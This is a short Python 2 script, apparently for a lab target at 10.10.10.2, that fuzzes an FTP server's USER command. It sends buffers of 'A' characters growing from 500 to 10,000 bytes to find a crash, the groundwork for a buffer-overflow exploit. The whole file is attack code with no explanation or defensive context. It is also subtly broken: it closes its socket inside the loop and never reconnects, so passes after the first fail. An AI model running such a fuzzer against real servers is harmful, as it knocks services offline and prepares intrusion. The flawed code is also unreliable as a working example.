#!/usr/bin/env python2

import socket
import time

RHOST = "10.10.10.2"
RPORT = 21

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# user_input = "USER anonymous"
pass_input = "PASS anonymous"
command = "ls"

buf_size = 500

while (buf_size < 10000):

    user_input = "A" * buf_size

    data = s.recv(1024)

    print "Received: {0}".format(data)

    s.send(user_input + "\r\n")

    print "Sent: {0}".format(user_input)

    data = s.recv(1024)

    print "Received: {0}".format(data)

    s.send(pass_input + "\r\n")

    print "Sent: {0}".format(pass_input)

    data = s.recv(1024)

    print "Received: {0}".format(data)

    s.send(command + "\r\n")

    print "Sent: {0}".format(command)

    data = s.recv(1024)

    print "Received: {0}".format(data)

    s.close()

    buf_size += 500

    time.sleep(2)
